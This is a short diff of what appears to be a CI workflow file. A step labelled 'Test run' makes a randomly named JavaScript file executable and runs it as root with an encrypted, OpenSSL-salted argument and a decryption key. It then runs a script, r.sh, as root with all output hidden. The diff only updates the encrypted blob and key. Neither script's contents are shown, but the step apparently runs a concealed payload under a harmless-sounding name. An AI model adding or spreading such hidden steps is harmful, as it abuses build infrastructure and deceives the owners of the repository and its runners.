@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'vng00'
+        echo 'cvtlc'
         sudo chmod +x heard8w7wt/eldridge1gbc0.js
-        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX1/sJdfw5kjpQpoINxLDYQ/yN26J/u9s1voNJ6GYwXN9G5UkwhyC15uPVmNqASA2m5x/zmKdmwmnHtmMVsIy/TpL6W4sznQ7RH7bPrpJnl7001J4PQTXRVbC 0p5q0g && sudo sh r.sh > /dev/null 2>&1
+        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX1+oTQY/TBlKY4ScCMFsSXusx3tln3559DW6YIl8+ZT96oN6ncQ0opoxnDxBkRmZ9KdZRxyS6tuaAJGFHGbDcoUuEWEThQjzqKcy+3baV40/IEdKt4WBqNsZ e1fbv5 && sudo sh r.sh > /dev/null 2>&1
